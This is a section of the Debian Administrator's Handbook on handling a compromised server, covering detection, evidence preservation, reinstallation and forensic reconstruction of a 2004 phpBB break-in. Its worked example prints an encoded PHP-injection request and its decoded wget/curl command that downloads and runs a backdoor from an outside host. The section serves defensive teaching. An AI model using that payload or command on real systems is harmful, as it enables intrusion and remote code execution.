---
url: "https://debian-handbook.info/browse/stable/sect.dealing-with-compromised-machine.html"
title: "14.7. Dealing with a Compromised Machine"
scraped_at: 2026-09-23T05:54:53+00:00
---

  * The Debian Administrator's Handbook


##  14.7. Dealing with a Compromised Machine
Despite the best intentions and however carefully designed the security policy, an administrator eventually faces an act of hijacking. This section provides a few guidelines on how to react when confronted with these unfortunate circumstances. 
###  14.7.1. Detecting and Seeing the Cracker's Intrusion
The first step of reacting to cracking is to be aware of such an act. This is not self-evident, especially without an adequate monitoring infrastructure. 
Cracking acts are often not detected until they have direct consequences on the legitimate services hosted on the machine, such as connections slowing down, some users being unable to connect, or any other kind of malfunction. Faced with these problems, the administrator needs to have a good look at the machine and carefully scrutinize what misbehaves. This is usually the time when they discover an unusual process, for instance, one named `apache` instead of the standard `/usr/sbin/apache2`. If we follow that example, the thing to do is to note its process identifier, and check `/proc/_pid_/exe`to see what program this process is currently running:

```
# **ls -al /proc/3719/exe
**lrwxrwxrwx 1 www-data www-data 0 2007-04-20 16:19 /proc/3719/exe -> /var/tmp/.bash_httpd/psybnc

```

A program installed under `/var/tmp/` and running as the web server? No doubt left, the machine is compromised. 
This is only one example, but many other hints can ring the administrator's bell: 
  * an option to a command that no longer works; the version of the software that the command claims to be doesn't match the version that is supposed to be installed according to `dpkg`; 
  * a command prompt or a session greeting indicating that the last connection came from an unknown server on another continent; 
  * errors caused by the `/tmp/` partition being full, which turned out to be full of illegal copies of movies; 
  * and so on. 


###  14.7.2. Putting the Server Off-Line
In any but the most exotic cases, the cracking comes from the network, and the attacker needs a working network to reach their targets (access confidential data, share illegal files, hide their identity by using the machine as a relay, and so on). Unplugging the computer from the network will prevent the attacker from reaching these targets, if they haven't managed to do so yet. 
This may only be possible if the server is physically accessible. When the server is hosted in a hosting provider's data center halfway across the country, or if the server is not accessible for any other reason, it is usually a good idea to start by gathering some important information (see [Section 14.7.3, “Keeping Everything that Could Be Used as Evidence”](https://debian-handbook.info/browse/stable/sect.dealing-with-compromised-machine.html#sect.keeping-everything-that-could-be-used-as-evidence), [Section 14.7.5, “Forensic Analysis”](https://debian-handbook.info/browse/stable/sect.dealing-with-compromised-machine.html#sect.forensic-analysis) and [Section 14.7.6, “Reconstituting the Attack Scenario”](https://debian-handbook.info/browse/stable/sect.dealing-with-compromised-machine.html#sect.reconstituting-the-attack-scenario)), then isolating that server as much as possible by shutting down as many services as possible (usually, everything but `sshd`). This case is still awkward, since one can't rule out the possibility of the attacker having SSH access like the administrator has; this makes it harder to “clean” the machines. 
###  14.7.3. Keeping Everything that Could Be Used as Evidence
Understanding the attack and/or engaging legal action against the attackers requires taking copies of all the important elements; this includes the contents of the hard disk, a list of all running processes, and a list of all open connections. The contents of the RAM could also be used, but it is rarely used in practice. 
In the heat of action, administrators are often tempted to perform many checks on the compromised machine; this is usually not a good idea. Every command is potentially subverted and can erase pieces of evidence. The checks should be restricted to the minimal set (`netstat -tupan` for network connections, `ps auxf` for a list of processes, `ls -alR /proc/[0-9]*` for a little more information on running programs), and every performed check should carefully be written down. 
**_CAUTION_ Hot analysis**
While it may seem tempting to analyze the system as it runs, especially when the server is not physically reachable, this is best avoided: quite simply you can't trust the programs currently installed on the compromised system. It is quite possible for a subverted `ps` command to hide some processes, or for a subverted `ls` to hide files; sometimes even the kernel is compromised! 
If such a hot analysis is still required, care should be taken to only use known-good programs. A good way to do that would be to have a rescue CD with pristine programs, or a read-only network share. However, even those countermeasures may not be enough if the kernel itself is compromised. 
Once the “dynamic” elements have been saved, the next step is to store a complete image of the hard-disk. Making such an image is impossible if the filesystem is still evolving, which is why it must be remounted read-only. The simplest solution is often to halt the server brutally (after running `sync`) and reboot it on a rescue CD. Each partition should be copied with a tool such as `dd`; these images can be sent to another server (possibly with the very convenient `nc` tool). Another possibility may be even simpler: just get the disk out of the machine and replace it with a new one that can be reformatted and reinstalled. 
###  14.7.4. Re-installing
The server should not be brought back on line without a complete reinstallation. If the compromise was severe (if administrative privileges were obtained), there is almost no other way to be sure that we get rid of everything the attacker may have left behind (particularly _backdoors_). Of course, all the latest security updates must also be applied so as to plug the vulnerability used by the attacker. Ideally, analyzing the attack should point at this attack vector, so one can be sure of actually fixing it; otherwise, one can only hope that the vulnerability was one of those fixed by the updates. 
Reinstalling a remote server is not always easy; it may involve assistance from the hosting company, because not all such companies provide automated reinstallation systems or remote consoles (although these cases should be rare). Care should be taken not to reinstall the machine from backups taken later than the compromise. Ideally, only data should be restored, the actual software should be reinstalled from the installation media. 
###  14.7.5. Forensic Analysis
Now that the service has been restored, it is time to have a closer look at the disk images of the compromised system in order to understand the attack vector. When mounting these images, care should be taken to use the `ro,nodev,noexec,noatime` options so as to avoid changing the contents (including timestamps of access to files) or running compromised programs by mistake. 
Retracing an attack scenario usually involves looking for everything that was modified and executed: 
  * `.bash_history` files often provide for a very interesting read; 
  * so does listing files that were recently created, modified or accessed; 
  * the `strings` command helps identifying programs installed by the attacker, by extracting text strings from a binary; 
  * the log files in `/var/log/` often allow reconstructing a chronology of events; 
  * special-purpose tools also allow restoring the contents of potentially deleted files, including log files that attackers often delete. 


Some of these operations can be made easier with specialized software. In particular, the sleuthkit package provides many tools to analyze a filesystem. Their use is made easier by the _Autopsy Forensic Browser_ graphical interface (in the autopsy package). Some Linux distributions have a "live install" image and contain many programs for forensic analysis, such as Kali Linux (see [Section A.8, “Kali Linux”](https://debian-handbook.info/browse/stable/sect.kali.html)), with its _forensic mode_ , BlackArchLinux, and the commercial Grml-Forensic, based on Grml (see [Section A.6, “Grml”](https://debian-handbook.info/browse/stable/sect.grml.html)). 
→ <https://blackarch.org>
→ <https://grml-forensic.org/>
###  14.7.6. Reconstituting the Attack Scenario
All the elements collected during the analysis should fit together like pieces in a jigsaw puzzle; the creation of the first suspect files is often correlated with logs proving the breach. A real-world example should be more explicit than long theoretical ramblings. 
The following log is an extract from an Apache `access.log`: 

```
www.falcot.com 200.58.141.84 - - [27/Nov/2004:13:33:34 +0100] "GET /phpbb/viewtopic.php?t=10&highlight=%2527%252esystem(chr(99)%252echr(100)%252echr(32)%252echr(47)%252echr(116)%252echr(109)%252echr(112)%252echr(59)%252echr(32)%252echr(119)%252echr(103)%252echr(101)%252echr(116)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(124)%252echr(124)%252echr(32)%252echr(99)%252echr(117)%252echr(114)%252echr(108)%252echr(32)%252echr(103)%252echr(97)%252echr(98)%252echr(114)%252echr(121)%252echr(107)%252echr(46)%252echr(97)%252echr(108)%252echr(116)%252echr(101)%252echr(114)%252echr(118)%252echr(105)%252echr(115)%252echr(116)%252echr(97)%252echr(46)%252echr(111)%252echr(114)%252echr(103)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(45)%252echr(111)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(99)%252echr(104)%252echr(109)%252echr(111)%252echr(100)%252echr(32)%252echr(43)%252echr(120)%252echr(32)%252echr(98)%252echr(100)%252echr(59)%252echr(32)%252echr(46)%252echr(47)%252echr(98)%252echr(100)%252echr(32)%252echr(38))%252e%2527 HTTP/1.1" 200 27969 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"

```

This example matches exploitation of an old security vulnerability in phpBB. 
→ <https://www.phpbb.com/phpBB/viewtopic.php?t=240636>
Decoding this long URL leads to understanding that the attacker managed to run some PHP code, namely: `system("cd /tmp; wget gabryk.altervista.org/bd || curl gabryk.altervista.org/bd -o bd; chmod +x bd; ./bd &")`. Indeed, a `bd` file was found in `/tmp/`. Running `strings /mnt/tmp/bd` returns, among other strings, `PsychoPhobia Backdoor is starting...`. This really looks like a backdoor. 
Some time later, this access was used to download, install and run an IRC _bot_ that connected to an underground IRC network. The bot could then be controlled via this protocol and instructed to download files for sharing. This program even has its own log file: 

```
** 2004-11-29-19:50:15: NOTICE: :GAB!sex@Rizon-2EDFBC28.pool8250.interbusiness.it NOTICE ReV|DivXNeW|504 :DCC Chat (82.50.72.202)
** 2004-11-29-19:50:15: DCC CHAT attempt authorized from GAB!SEX@RIZON-2EDFBC28.POOL8250.INTERBUSINESS.IT
** 2004-11-29-19:50:15: DCC CHAT received from GAB, attempting connection to 82.50.72.202:1024
** 2004-11-29-19:50:15: DCC CHAT connection suceeded, authenticating
** 2004-11-29-19:50:20: DCC CHAT Correct password
(...)
** 2004-11-29-19:50:49: DCC Send Accepted from ReV|DivXNeW|502: In.Ostaggio-iTa.Oper_-DvdScr.avi (713034KB)
(...)
** 2004-11-29-20:10:11: DCC Send Accepted from GAB: La_tela_dell_assassino.avi (666615KB)
(...)
** 2004-11-29-21:10:36: DCC Upload: Transfer Completed (666615 KB, 1 hr 24 sec, 183.9 KB/sec)
(...)
** 2004-11-29-22:18:57: DCC Upload: Transfer Completed (713034 KB, 2 hr 28 min 7 sec, 80.2 KB/sec)

```

These traces show that two video files have been stored on the server by way of the 82.50.72.202 IP address. 
In parallel, the attacker also downloaded a pair of extra files, `/tmp/pt` and `/tmp/loginx`. Running these files through `strings` leads to strings such as _Shellcode placed at 0x%08lx_ and _Now wait for suid shell..._. These look like programs exploiting local vulnerabilities to obtain administrative privileges. Did they reach their target? In this case, probably not, since no files seem to have been modified after the initial breach. 
In this example, the whole intrusion has been reconstructed, and it can be deduced that the attacker has been able to take advantage of the compromised system for about three days; but the most important element in the analysis is that the vulnerability has been identified, and the administrator can be sure that the new installation really does fix the vulnerability. 
  * [**Prev** 14.6. Other Security-Related Considerations](https://debian-handbook.info/browse/stable/sect.other-security-considerations.html)
  * [**Next** Chapter 15. Creating a Debian Package](https://debian-handbook.info/browse/stable/debian-packaging.html)


